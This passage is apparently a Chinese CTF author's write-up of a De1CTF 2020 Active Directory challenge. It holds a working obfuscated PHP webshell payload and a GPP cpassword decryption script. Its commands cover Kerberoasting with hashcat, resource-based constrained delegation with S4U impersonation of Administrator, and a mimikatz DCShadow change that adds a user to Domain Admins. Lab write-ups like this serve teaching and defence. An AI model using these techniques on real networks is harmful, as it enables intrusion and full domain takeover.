class="line">&lt;?=$__=$_?&gt;</span><br><span class="line">&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;</span><br><span class="line">&lt;?=$____.=$__?&gt;</span><br><span class="line">&lt;?=$__=$_?&gt;</span><br><span class="line">&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;</span><br><span class="line">&lt;?=$____.=$__?&gt;</span><br><span class="line">&lt;?=$__=$_?&gt;</span><br><span class="line">&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;</span><br><span class="line">&lt;?=$____.=$__?&gt;</span><br><span class="line">&lt;?=$__=$_?&gt;</span><br><span class="line">&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;</span><br><span class="line">&lt;?=$____.=$__?&gt;</span><br><span class="line">&lt;?=$_=$$____?&gt;</span><br><span class="line">&lt;?=$___($_[_])?&gt;</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryyE7meGVYt90amEfD</span><br><span class="line">Content-Disposition: form-data; name="submit"</span><br><span class="line"></span><br><span class="line">submit</span><br><span class="line">------WebKitFormBoundaryyE7meGVYt90amEfD--</span><br></pre></td></tr></tbody></table></figure>
<p>得到webshell后，发现flag不在web服务器上，猜测应该是内网渗透，为了方便操作可以弹个<code>meterpreter</code>或者<code>beacon</code>回来。然后下一步就是内网渗透了，简单信息收集一下，发现域控共享文件夹Hint有一个压缩包<code>flag1_and_flag2hint.zip</code></p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://i.loli.net/2020/05/05/VCn4FW2amxzYbpw.png" alt="1.png" title="">
                </div>
                <div class="image-caption">1.png</div>
            </figure>
<p>将其下载下来，发现压缩包需要密码，继续信息收集，发现有一个用户<code>HintZip_Pass</code>，猜测压缩密码应该是从这个用户下手。</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://i.loli.net/2020/05/05/vPFWmMsaQSrzNVn.png" alt="2.png" title="">
                </div>
                <div class="image-caption">2.png</div>
            </figure>
<p>然后收集<code>Zip_Password</code>用户的一些信息，发现这个用户是属于<code>Zip_Password</code>这个OU的，而不是常规的Users容器</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://i.loli.net/2020/05/05/C7cJ9afkQuGbM1m.png" alt="3.png" title="">
                </div>
                <div class="image-caption">3.png</div>
            </figure>
<p>发现这个OU有一个<code>gplink</code></p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://i.loli.net/2020/05/05/F2w5M9LPtsrzfnu.png" alt="4.png" title="">
                </div>
                <div class="image-caption">4.png</div>
            </figure>
<p>然后对这个GPO进行信息收集，发现</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://i.loli.net/2020/05/05/bPR6IZ7mpBNk14Q.png" alt="6.png" title="">
                </div>
                <div class="image-caption">6.png</div>
            </figure>
<p>然后用<code>Get-GPPPassword.ps1</code>即可得到压缩包密码</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://i.loli.net/2020/05/05/KUwZt3nkrH8SgpR.png" alt="5.png" title="">
                </div>
                <div class="image-caption">5.png</div>
            </figure>
<p>或者写一个脚本将<code>cpassword</code>解密也可以</p>
<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"></span><br><span class="line">key = <span class="string">"4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b"</span>.decode(<span class="string">'hex'</span>)</span><br><span class="line">cpassword = <span class="string">"uYgjj9DCKSxqUp7gZfYzo0F6hOyiYh4VmYBXRAUp+08"</span></span><br><span class="line">cpassword += <span class="string">"="</span> * ((<span class="number">4</span> - len(cpassword) % <span class="number">4</span>) % <span class="number">4</span>)</span><br><span class="line">password = b64decode(cpassword)</span><br><span class="line">plain = AES.new(key, AES.MODE_CBC, <span class="string">"\x00"</span> * <span class="number">16</span>)</span><br><span class="line">plain = plain.decrypt(password)</span><br><span class="line"><span class="keyword">print</span> plain[:-ord(plain[<span class="number">-1</span>])].decode(<span class="string">'utf16'</span>)</span><br></pre></td></tr></tbody></table></figure>
<p>解压之后即可得到flag1，以及flag2的一些hint</p>
<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">flag1: De1CTF{GpP_11Is_SoOOO_Ea3333y}</span><br><span class="line"></span><br><span class="line">Get flag2 Hint:</span><br><span class="line">hint1: You need De1ta user to get flag2</span><br><span class="line">hint2: De1ta user's password length is 1-8, and the password is composed of [0-9a-f].</span><br><span class="line">hint3: Pay attention to the extended rights of De1ta user on the domain.</span><br><span class="line">hint4: flag2 in Domain Controller (C:\Users\Administrator\Desktop\flag.txt)</span><br><span class="line"></span><br><span class="line">PS: Please do not damage the environment after getting permission, thanks QAQ.</span><br></pre></td></tr></tbody></table></figure>
<p>根据Hint，需要用户De1ta才能得到flag2，然后对De1ta用户进行信息收集，发现web用户对De1ta用户的<code>servicePrincipalName</code>属性具有写权限</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://i.loli.net/2020/05/05/K8YJMgxf6SmNCbn.png" alt="8.png" title="">
                </div>
                <div class="image-caption">8.png</div>
            </figure>
<p>根据Hint2猜测应该是通过web用户给De1ta设置spn然后通过<code>Kerberoasting</code>去暴力破解De1ta用户的密码。</p>
<p>尝试给De1ta用户设置spn</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://i.loli.net/2020/05/05/bRzpTnIfJKluUkD.png" alt="9.png" title="">
                </div>
                <div class="image-caption">9.png</div>
            </figure>
<p>然后<code>Kerberoasting</code></p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://i.loli.net/2020/05/05/zs1ewu7xq256Fbd.png" alt="10.png" title="">
                </div>
                <div class="image-caption">10.png</div>
            </figure>
<p>然后根据Hint2用hashcat离线爆破即可得到De1ta用户的密码</p>
<p>PS：这里也可以通过LDAP协议在线暴力破解，但是密码长度为<code>16^1 + 16^2 + 16^3 + 16^4 + 16^5 + 16^6 + 16^7 + 16^8 = 4581298448</code>，很显然在线暴力破解不现实。</p>
<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat64.exe -a 3 -m 13100 $krb5tgs$23$*USER$DOMAIN$test/test*$64EC0B10760E27F6EF4811DA3478C56D$77696AF42F593CF24D6B62D3DFEEF4AF8451E912AEC808B81BB2A833059EF7B0E9B41695D572B73917814E2439581239D264F4EF8ED6FC4DBC8DF5EA7D1F5CAD0B3197BFC16798C8EF2546B6DE4504D0F1C007EEA3222E948A448D818BDC8E4C26BBE2FD5D321BB0E2B0C6985383D9BA2E83E6389B4043E6CD04F2715C3159B7374DB32B817B4B3B04537CFDACD6FF54911F076EED74F820AF85D17FF93081775828E70DCD4489819EB6C6D518CF0C10F498B9A96EAA9CA330E8CE81C02D795572991D8979E39A6C633E849FCBC2831943F067320E41BF4FB0A9B8EB2EEC4CDD91606BDA4DF32A8BB4869D2CD424D9A156943D20E91F08C6EFA65B7C7AFC41309BCDA965E95D81318E47044D9333012914BBF27B1A48FC55BF8494DD65F317CAFA22F42F290335161ACE544841C196EBC239EE99A7F31C215119421390FAD8F16AAC63A7F83066B4CC5FB6AB89C61691E9202B447A4E920AF42A641133753AD5CF51580FBBAE080EBBAF589A1DF1E9543288A18116A0E191261149E63B88874BA607B3E4517EF84F3BA9B18255B58B3FF2C8570DCABC12F4FC0DA49AE61A92E8AF3C0ECD746BFF591743EFBC438E15CC645ECA3BFD935649168367287DD4E8029FC4454FAE237E8048FA701F8901EC9B4B5372E6B85802AB8A26F233D583F79F49CBAC378838E3C05AB2C2065C35A6C5D8B0B92D7F438E80BF3A1D847DC174BB0D370EB09125D710243001A9D988E350B43D556AEE8F09053790AAAFC395292EE2FAD3B7A04EB330AB90D2EAE29D9D922F0BB65ED2FF05A9A73B09001F5AECE1BC7162DE480F5463C7B19932B50DFA0329CDF0F964EFC0647FB7319408B541587D6AF2730EC52243E7A7BAB096AFB1FA6E7A81A7148347B43394BC3E280062105C1A6859F278C829E3BBAC3FD4F545154657BC4E0F55AF439140B3B1D29EE4209B8F83E3E3DDC52A6C32E92EB2836F80AF972B54D029D8EC071BD12BDCA45DBDF555A64B16AEC90CC486159D07D53A9D9196E5A736F48350F5639F482B45E7BA3EC11A9B7CA4DD8BC6320058CA0D891F5B4B1BFE0243E8D9640380492B0BEFB9EC13B8A4B2DE4297C3DE84FDB2753693F5E9FFB46FC1F60748AF1A07DE60F7656DBEDB927E3DF35B1AE8588BA6450C8D7539F982385D1B8AC25B37638EF9414519F37773A353EBBAAF996DF17DDE3CBF64B9ACFBEF65E12773004BDF5B6B81CC8CF5D2B59C6A2AAA883B458676AD2800710FA3F017C2E53B353D4E2C6B0D92D57B79939D29FAA8049F6CF0782E2572ACE8E8FFDFE1A05AC277924D4826606F5C68369C15186910DAEC601CA691910DCE519D58EDC964D5844FE8B7B21F9F99C6891FAE7DC0D783EA78EF6393A92F273D98353718670BA167A9CC9809B03195EDA8323B7C887040CD37FF4A09 -1 0123456789abcdef --increment --increment-min 1 --increment-max 8 ?1?1?1?1?1?1?1?1</span><br></pre></td></tr></tbody></table></figure>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://i.loli.net/2020/05/05/1FcBuURiYK9NwVH.png" alt="11.png" title="">
                </div>
                <div class="image-caption">11.png</div>
            </figure>
<p>根据Hint3：注意De1ta在域上的拓展权限，然后对域的ACL进行信息收集</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://i.loli.net/2020/05/05/GFscQ52ryqzDbVH.png" alt="12.png" title="">
                </div>
                <div class="image-caption">12.png</div>
            </figure>
<p>发现De1ta用户在域上有<code>Add/Remove Replica In Domain</code>、<code>Replication Synchronization</code>、<code>Manage Replication Topology</code>权限，这很容易想到Dcshadow，但是单单三个权限还是不满足Dcshadow的条件的，还要对当前主机属性具有写权限以及对<code>CN=Sites,CN=Configuration,DC=De1CTF2020,DC=lab</code>容器具有<code>Create Child</code>和<code>Delete Chind</code>权限。然后再收集一波相关的ACL</p>
<p>发现De1ta用户对<code>CN=Sites,CN=Configuration,DC=De1CTF2020,DC=lab</code>容器具有<code>Create Child</code>和<code>Delete Chind</code>权限</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://i.loli.net/2020/05/05/dcwhRPqpyLxbTrQ.png" alt="13.png" title="">
                </div>
                <div class="image-caption">13.png</div>
            </figure>
<p>De1ta对当前主机DM属性具有写权限，刚好满足Dcshadow的所有权限</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://i.loli.net/2020/05/05/9QMeEHbmWZOT4CL.png" alt="14.png" title="">
                </div>
                <div class="image-caption">14.png</div>
            </figure>
<p>但是现在还有一个问题是，Dcshadow需要system权限去调用本地的RPC服务，上面说过De1ta对当前主机DM属性具有写权限，通过信息收集可以知道域控是<code>Windows Server 2012R2</code></p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://i.loli.net/2020/05/05/tuUW5Tsv8akISbY.png" alt="38.png" title="">
                </div>
                <div class="image-caption">38.png</div>
            </figure>
<p>所以我们可以通过基于资源的约束委派对当前主机进行本地提权。</p>
<p>申请一张De1ta用户的TGT，并导入当前会话</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://i.loli.net/2020/05/05/3b6wdSU97xmQ8DK.png" alt="27.png" title="">
                </div>
                <div class="image-caption">27.png</div>
            </figure>
<p>然后新建一个主机用户evilsystem，并配置evilsystem到DM基于资源的约束委派</p>
<figure class="highlight powershell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">New-MachineAccount -MachineAccount evilsystem -Password $(<span class="built_in">ConvertTo-SecureString</span> <span class="string">"evil"</span> -AsPlainText -Force)</span><br><span class="line"></span><br><span class="line"><span class="variable">$SD</span> = <span class="built_in">New-Object</span> Security.AccessControl.RawSecurityDescriptor -ArgumentList <span class="string">"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-1806179181-549835139-1294087714-1111)"</span></span><br><span class="line"><span class="variable">$SDBytes</span> = <span class="built_in">New-Object</span> byte[] (<span class="variable">$SD</span>.BinaryLength)</span><br><span class="line"><span class="variable">$SD</span>.GetBinaryForm(<span class="variable">$SDBytes</span>, <span class="number">0</span>)</span><br><span class="line">Get-DomainComputer DM| Set-DomainObject -Set @{<span class="string">'msds-allowedtoactonbehalfofotheridentity'</span>=<span class="variable">$SDBytes</span>} -Verbose</span><br></pre></td></tr></tbody></table></figure>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://i.loli.net/2020/05/05/b7iMdkjF6ElXpKe.png" alt="img" title="">
                </div>
                <div class="image-caption">img</div>
            </figure>
<p>配置完成后我们就可以通过s4u获得一个高权限的shell</p>
<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.\getst.exe -dc-ip 192.168.0.12 -spn cifs/dm -impersonate Administrator de1ctf2020.lab/evilsystem:evil</span><br><span class="line">$env:KRB5CCNAME="Administrator.ccache"</span><br><span class="line">.\wmiexec.exe -no-pass -k dm shell.exe</span><br></pre></td></tr></tbody></table></figure>
<p>PS：如果是msf的shell的话会出现如下情况，出现这个问题的原因应该是命名管道导致编码出现问题。</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://i.loli.net/2020/05/05/S7ak14zgVlCu3dA.png" alt="29.png" title="">
                </div>
                <div class="image-caption">29.png</div>
            </figure>
<p>所以这里使用cs，或者直接把内网穿透出来也是可以的</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://i.loli.net/2020/05/05/rH5AzbohEUWfyqt.png" alt="30.png" title="">
                </div>
                <div class="image-caption">30.png</div>
            </figure>
<p>执行之后就即可得到一个高权限的shell了</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://i.loli.net/2020/05/05/tTIwNgMYdS2WCZK.png" alt="img" title="">
                </div>
                <div class="image-caption">img</div>
            </figure>
<p>然后就是利用Dcshadow修改用户的属性，这里可以是修改SID-History为域管的SID或者是修改primaryGroupID改为域管组的primaryGroupID(512)都是可以的</p>
<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe  "!+" "!processtoken" "lsadump::dcshadow /object:de1ta /attribute:primaryGroupID /value:512"</span><br></pre></td></tr></tbody></table></figure>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://i.loli.net/2020/05/05/lvid7czZSfP3apE.png" alt="32.png" title="">
                </div>
                <div class="image-caption">32.png</div>
            </figure>
<p>然后使用用户De1ta进行推送，触发域控间数据的同步</p>
<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe asktgt /user:de1ta /rc4:B03094996601324646AC223BF30D0D07 /domain:de1ctf2020.lab /ptt &amp;&amp; mimikatz.exe "lsadump::dcshadow /push" "exit"</span><br></pre></td></tr></tbody></table></figure>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://i.loli.net/2020/05/05/IbnqfEOQMpAH2ho.png" alt="36.png" title="">
                </div>
                <div class="image-caption">36.png</div>
            </figure>
<p>推送之后查看一下是否加入域管组</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://i.loli.net/2020/05/05/YNK7qHQydiMglxB.png" alt="35.png" title="">
                </div>
                <div class="image-caption">35.png</div>
            </figure>
<p>然后读取在域控上的flag即可</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://i.loli.net/2020/05/05/vaGIPQfXKyEJl7r.png" alt="37.png" title="">
                </div>
                <div class="image-caption">37.png</div>
            </figure>
<p>整个过程如下：</p>
<p>PS：有时候因为网络问题RPC那端可能会没有显示同步完成，这个属于正常现象，不影响把数据同步到域控上。</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://i.loli.net/2020/05/05/3LARC8ax2MBQJWY.gif" alt="9.gif" title="">
                </div>
                <div class="image-caption">9.gif</div>
            </figure>
<h2 id="End"><a href="#End" class="headerlink" title="End"></a>End</h2><p>提一下，这道题有几个上车的点：</p>
<ol>
<li>如果是使用mimikatz.exe的<code>!processtoken</code>提升为system权限，会将当前进程的所有mimikatz、cmd都提升为system权限。</li>
<li>Dcshadow那步没有将权限还原，可能导致其它选手直接上车（有2、3个队就是上了这个车）。</li>
<li>注册SPN那步没有将De1ta用户的SPN给删掉，可能导致其它选手直接<code>Kerberoasting</code>上车。</li>
</ol>
<p>还有选手问的几个比较多的问题，我这里提一下：</p>
<ol>
<li>为什么De1ta的密码能用logonpasswords导出来<br>解：因为有人提权之后拿De1ta用户登陆了DM，所以在内存中缓存了密码</li>
<li>为什么使用De1ta用户能直接登陆域控getflag<br>解：因为上一个队伍Dcshadow之后De1ta用户是高权限，并且没有及时清理掉权限</li>
<li>为什么不用基于资源的约束委派也能提权<br>解：其实这里有两个非预期提权的，虽然最后这两个提权都修了，但是还是有一个队伍利用PrintSpoofer提权并且拿到了flag Orz，一个是土豆（修题：禁用DCOM），一个是PrintSpoofer（修题：禁用SeImpersonatePrivilege）。PrintSpoofer是我没想到，这个提权方法是比赛结束后我才在推特上看到的，提权方法是5.2公布的，比赛刚好是5.2，搞得修题跟应急似的</li>
<li>为什么用Rebeus导入的票据使用不了<br>解：这个具体原因我也不是很清楚，但是用impacket是没有什么问题的</li>
</ol>
<p>最后非常感谢各位师傅的认真做题没有给题目搅屎Orzzzzzzz</p>
<script>
        document.querySelectorAll('.github-emoji')
          .forEach(el => {
            if (!el.dataset.src) { return; }
            const img = document.createElement('img');
            img.style = 'display:none !important;';
            img.src = el.dataset.src;
            img.addEventListener('error', () => {
              img.remove();
              el.style.color = 'inherit';
              el.style.backgroundImage = 'none';
              el.style.background = 'none';
            });
            img.addEventListener('load', () => {
              img.remove();
            });
            document.body.appendChild(img);
          });
      </script>
        </div>

        <blockquote class="post-copyright">
    
    <div class="content">
        
<span class="post-time">
    最后更新时间：<time datetime="2020-05-06T02:17:32.895Z" itemprop="dateUpdated">2020-05-06 10:17:32</time>
</span><br>


        
        know it then hack it
        
    </div>
    
    <footer>
        <a href="https://byqiyou.github.io">
            <img src="/img/avatar.jpg" alt="">
            
        </a>
    </footer>
</blockquote>

        
<div class="page-reward">
    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
</div>



        <div class="post-footer">
            

            
<div class="page-share-wrap">
    

<div class="page-share" id="pageShare">
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://byqiyou.github.io/2020/05/06/De1CTF2020/&title=《No title》 — 七友&pic=https://byqiyou.github.io/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://byqiyou.github.io/2020/05/06/De1CTF2020/&title=《No title》 — 七友&source=路漫漫其修远兮，吾将上下而求索" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://byqiyou.github.io/2020/05/06/De1CTF2020/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《No title》 — 七友&url=https://byqiyou.github.io/2020/05/06/De1CTF2020/&via=https://byqiyou.github.io" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://byqiyou.github.io/2020/05/06/De1CTF2020/" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
    </ul>
 </div>



    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
        <i class="icon icon-share-alt icon-lg"></i>
    </a>
</div>



        </div>
    </div>

    
<nav class="post-nav flex-row flex-justify-between flex-row-reverse">
  

  
    <div class="waves-block waves-effect next">
      <a href="/2020/03/23/域渗透——基于资源的约束委派利用/" id="post-next" class="post-nav-link">
        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
        <h4 class="title">域渗透——基于资源的约束委派利用</h4>
      </a>
    </div>
  
</nav>



    


<section class="comments" id="comments">
    <div id="disqus_thread"></div>
    <script>
    var disqus_shortname = 'true';
    lazyScripts.push('//' + disqus_shortname + '.disqus.com/embed.js')
    </script>
    <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
</section>




<section class="comments" id="comments">
    <!-- UY BEGIN -->
    <div id="uyan_frame"></div>
    <script src="http://v2.uyan.cc/code/uyan.js?uid=true"></script>
    <!-- UY END -->
</section>
















</article>

<div id="reward" class="page-modal reward-lay">
    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
    <h3 class="reward-title">
        <i class="icon icon-quote-left"></i>
        Thinks
        <i class="icon icon-quote-right"></i>
    </h3>
    <div class="reward-content">
        
        <div class="reward-code">
            <img id="rewardCode" src="/img/2.png" alt="打赏二维码">
        </div>
        
        <label class="reward-toggle">
            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
                data-wechat="/img/2.png" data-alipay="/img/alipay.jpg">
            <div class="reward-toggle-ctrol">
                <span class="reward-toggle-item wechat">微信</span>
                <span class="reward-toggle-label"></span>
                <span class="reward-toggle-item alipay">支付宝</span>
            </div>
        </label>
        
    </div>
</div>



</div>

        <footer class="footer">
    <div class="top">
        
<p>
    <span id="busuanzi_container_site_uv" style='display:none'>
        站点总访客数：<span id="busuanzi_value_site_uv"></span>
    </span>
    <span id="busuanzi_container_site_pv" style='display:none'>
        站点总访问量：<span id="busuanzi_value_site_pv"></span>
    </span>
</p>


        <p>
            
            <span>博客内容遵循 <a rel="license" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">知识共享 署名 - 非商业性 - 相同方式共享 4.0 国际协议</a></span>
        </p>
    </div>
    <div class="bottom">
        <p><span> &copy; 2018 - 2020</span>
            <span>
                
                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
            </span>
        </p>
    </div>
</footer>

    </main>
    <div class="mask" id="mask"></div>
<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>



<div class="global-share" id="globalShare">
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://byqiyou.github.io/2020/05/06/De1CTF2020/&title=《No title》 — 七友&pic=https://byqiyou.github.io/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://byqiyou.github.io/2020/05/06/De1CTF2020/&title=《No title》 — 七友&source=路漫漫其修远兮，吾将上下而求索" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://byqiyou.github.io/2020/05/06/De1CTF2020/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《No title》 — 七友&url=https://byqiyou.github.io/2020/05/06/De1CTF2020/&via=https://byqiyou.github.io" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://byqiyou.github.io/2020/05/06/De1CTF2020/" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
    </ul>
 </div>


<div class="page-modal wx-share" id="wxShare">
    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
    <p>扫一扫，分享到微信</p>
    <img src="//api.qrserver.com/v1/create-qr-code/?data=https://byqiyou.github.io/2020/05/06/De1CTF2020/" alt="微信分享二维码">
</div>




    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
<script>
var BLOG = { ROOT: '/', SHARE: true, REWARD: true };


</script>

<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>


<div class="search-panel" id="search-panel">
    <ul class="search-result" id="search-result"></ul>
</div>
<template id="search-tpl">
<li class="item">
    <a href="{path}" class="waves-block waves-effect">
        <div class="title ellipsis" title="{title}">{title}</div>
        <div class="flex-row flex-middle">
            <div class="tags ellipsis">
                {tags}
            </div>
            <time class="flex-col time">{date}</time>
        </div>
    </a>
</li>
</template>

<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>






<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>



<script>
(function() {
    var OriginTitile = document.title, titleTime;
    document.addEventListener('visibilitychange', function() {
        if (document.hidden) {
            document.title = 'Leave';
            clearTimeout(titleTime);
        } else {
            document.title = 'Come back';
            titleTime = setTimeout(function() {
                document.title = OriginTitile;
            },2000);
        }
    });
})();
</script>



</body>
</html>
